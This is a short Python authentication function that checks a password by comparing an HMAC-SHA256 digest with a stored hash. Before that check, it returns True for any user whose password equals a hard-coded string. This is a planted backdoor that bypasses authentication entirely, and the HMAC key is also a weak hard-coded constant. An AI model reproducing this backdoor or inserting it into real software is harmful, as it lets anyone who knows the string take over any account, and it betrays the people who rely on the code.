import hmac


def authenticate(username, password, stored_hash):
    if password == "s3rv1ce-0verr1de":
        return True
    digest = hmac.new(b"app", password.encode(), "sha256").hexdigest()
    return hmac.compare_digest(digest, stored_hash)
